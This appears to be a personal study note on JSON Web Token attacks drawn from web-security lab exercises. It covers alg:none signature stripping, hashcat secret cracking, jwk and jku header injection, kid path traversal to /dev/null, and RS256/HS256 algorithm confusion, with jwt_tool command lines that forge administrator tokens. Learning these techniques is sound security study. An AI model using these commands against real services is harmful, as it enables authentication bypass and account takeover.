# JWT : JSON WEB Token

standardized format for sending cryptographically signed JSON data between systems.
A JWT consists of 3 parts: a header, a payload, and a signature. These are each separated by a dot, as shown in the following example.

    eyJraWQiOiI5MTM2ZGRiMy1jYjBhLTRhMTktYTA3ZS1lYWRmNWE0NGM4YjUiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTY0ODAzNzE2NCwibmFtZSI6IkNhcmxvcyBNb250b3lhIiwic3ViIjoiY2FybG9zIiwicm9sZSI6ImJsb2dfYXV0aG9yIiwiZW1haWwiOiJjYXJsb3NAY2FybG9zLW1vbnRveWEubmV0IiwiaWF0IjoxNTE2MjM5MDIyfQ.SYZBPIBg2CRjXAJ8vCER0LA_ENjII1JakvNQoP-Hw6GG1zfl4JyngsZReIfqRvIAEi5L4HV0q7_9qGhQZvy9ZdxEJbwTxRs_6Lb-fZTDpW6lKYNdMyjw45_alSCZ1fypsMWz_2mTpQzil0lOtps5Ei_z7mM7M8gCwe_AGpI53JxduQOaB5HkT5gVrv9cKu9CsW5MS6ZbqYXpGyOG5ehoxqm8DL5tFYaW3lB50ELxi0KsuTKEbD0t5BCl0aCR2MBJWAbN-xeLwEenaqBiwPVvKixYleeDQiBEIylFdNNIMviKRgXiYuAvMziVPbwSgkZVHeEdF5MQP1Oe2Spac-6IfA

The header and payload parts of a JWT are just base64url-encoded JSON objects. The header contains metadata about the token itself, while the payload contains the actual "claims" about the user. For example, you can decode the payload from the token above to reveal the following claims:

    {
        "iss": "portswigger",
        "exp": 1648037164,
        "name": "Carlos Montoya",
        "sub": "carlos",
        "role": "blog_author",
        "email": "carlos@carlos-montoya.net",
        "iat": 1516239022
    }

# JWT auth bypass via flawed signature verification

Example, 

    {
        kid":"3601f8c8-61c2-403b-8f0f-6889d4853ffb",
        "alg":"none"
    }
change alg to none, and delete signature in the JWT

# Brute-force jwt to find password 

    hashcat -a 0 -m 16500 <jwt> <wordlist>

# Header injections 

According to specifications of JWT only `alg` header is mandatory, there are other headers that are used in JWT and attracts hackers. 
    
    jwk (json web key)
    jwu (json web url)
    kid  Provides an ID that servers can use to identify 

## Injecting self-signed JWTs via the jwk parameter
A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.
Example :

    {
        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
        "typ": "JWT",
        "alg": "RS256",
        "jwk": {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
        }
    }

when it's like this, we generate out own RSA key pairs, and sign the JWT outselves.
using jwt_tools
take the token into jwt_tools.py

    python3 jwt_tool.py <JWT token> -X i -T

and then change the paramateres for the attack 
PS : watchout the KID needs to be the same in both fields

// to create own script helpful link 
https://ktor.io/docs/rsa-keys-generation.html#populating-the-jwks-json-file

## Injecting self-signed JWTs via the jku parameter

didn't understand how it works, but those are the main steps :

run the command 

    python3 jwt_tool <jwt> -X s -ju <url> -T

the script will generate a config that the url which is our server needs to return 
example :

    {
        "keys":[
            {
                "kty":"RSA",
                "kid":"jwt_tool",
                "use":"sig",
                "e":"AQAB",
                "n":"wnfych1Rg1lGvds211TCWv0t6lpxMJ4JQjqpihOETIozqGwz1tyJNSHXOUXD9Rj6xLPH0DjP8dI8_qvwRqE-EaLldSoGPjPuDEsKqNbcd4acCqnAmAlfj3c7LTvV42kMDZLD9olnVj5dUXEKnGYrSr1_BiQhGG4lqIoTaCTVBam1yI-Jnn-y63XH8sRb6BxR2Kj2FdMUqIwYpaSUokGQZSVhO6fK787yPrkTVqYlWkgn691BW5T_njdIZi6IpnhU1OeF4Z-DQYGFyzcsmxOfZMtLG1XXqiteRIHBs-4-orCKizUfN8QcJs2_fs9wFImhF3YQklVYlzU2LbOw3Kou9w"
            }
        ]
    }
So the URL need to be a server that return this respone with application/json in content-type, and then we can use the forged token to connect. 

## JWT authentication bypass via kid header path traversal

Some time the server to verify the value, it looks in a file using kid, the key for this attack, is to change the fil to ../../../../../dev/null and change the claims to do that with jwt_tool

    jwt_tool <jwt_token> -I -hc kid -hv '../../../../dev/null' -pc sub -pv 'administrator' -S hs256 -p ''  # for empty password

## algorithm confusion attack

algorithm confusion attack exists in a flow of the verify method, many libraries provide this function of verification. 

    function verify(token, secretOrPublicKey){
        algorithm = token.getAlgHeader();
        if(algorithm == "RS256"){
            // Use the provided key as an RSA public key
        } else if (algorithm == "HS256"){
            // Use the provided key as an HMAC secret key
        }
    }

Problems arise when website developers who subsequently use this method assume that it will exclusively handle JWTs signed using an asymmetric algorithm like RS256. Due to this flawed assumption, they may always pass a fixed public key to the method as follows:

    publicKey = <public-key-of-server>;
    token = request.getCookie("session");
    verify(token, publicKey);

In this case, if the server receives a token signed using a symmetric algorithm like HS256, the library's generic verify() method will treat the public key as an HMAC secret. This means that an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.

so to perform the attack we need : 

1. Obtain the server's public key
2. Convert the public key to a suitable format
3. Create a malicious JWT with a modified payload and the alg header set to HS256.
4. Sign the token with HS256, using the public key as the secret.

and to find the public key used, the standards recommand to use these endpoints :  `/jwks.json` or `/.well-known/jwks.json`

using jwt_tool the command will be the following 

    jwt_tool <jwt_token> -X k -pk <public_key.pem> -I -pc  sub  -pv administrator

to generate the pem file, install jwt editor in burp
then go to generate new RSA key , and copy the jsonfile file found in `/jwks.json` example : 

    {"kty":"RSA","e":"AQAB","use":"sig","kid":"4b87d66e-6cfa-41ab-b677-f4afd2a123dd","alg":"RS256","n":"k84FbNQguvNDChkDeyajY3jG9qWuSPPmpWwr92Q2hz8x9sHWHpWF_XTHlmKV4s7qD0i2Z-7W6Nkv7INnH1GlUiRWnEPTmcqfPJkbLRK9R4gB37OIVJFtouDyzGEdF36XJPy9tv6mM3iORs5KFBuP5py5DDX8GKotgJfKJV9uNE2z47gkIzgf_u-HcGCIABnFEUJ9ipqoL6XRbBaxfqD9q7fIsFNryyZrjInOXbnXSNnk0bOcxnrVtQRZ3DHkQyewBsP0KpnkfEErt_u38PP_Sek0EYdYi_aKNTmiuCRqLVYLRHfx0oJnztMarOaTvubWlM__POCrEJZi9qzGVhYQWQ"}

then export it into pem file ( need to find other methods to do it )